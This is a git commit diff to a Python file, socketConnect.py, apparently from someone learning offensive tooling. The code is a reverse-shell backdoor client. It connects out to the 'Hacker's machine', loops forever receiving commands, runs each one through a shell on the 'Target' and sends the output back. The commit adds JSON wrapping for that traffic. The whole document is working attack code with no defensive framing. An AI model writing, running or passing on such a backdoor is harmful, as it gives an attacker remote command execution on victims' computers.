c804b472a5f5babd67fe513bda5524769025f5b3
Mousa Muigai <mousa@mousa.Mousa>
2026-05-15 16:53:06 +0300

    Socket Connection

--- socketConnect.py
+++ socketConnect.py
@@ -1,6 +1,7 @@
 import socket
 #from socket import SOCK_STREAM, socket, AF_INET
 import subprocess
+import json
 
 class SocketConnection:
     def __init__(self,ip,port):
@@ -8,15 +9,25 @@ class SocketConnection:
         self.connection.connect((ip, port))  # Connect to Hacker's machine
         # self.connection.send(b"Connection established...\n")
 
-    # Create a subprocess to execute on Terminal of Target
+    # Sending Input
+    def json_send(self,data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode())
+
+    # Processing Input
+    def json_receive(self):
+        json_data = self.connection.recv(1024)
+        return json.loads(json_data.decode())
+
+    # Getting Input by Creating a subprocess to execute on Terminal of Target
     def command_execution(self,command):
         return subprocess.check_output(command, shell=True)
 
     def start_socket(self):
         while True: # Create infinite loop of execution of commands
-            command = self.connection.recv(1024).decode()
+            command = self.json_receive()
             command_output = self.command_execution(command)
-            self.connection.send(command_output)
+            self.json_send(command_output)
         self.connection.close()
 
 
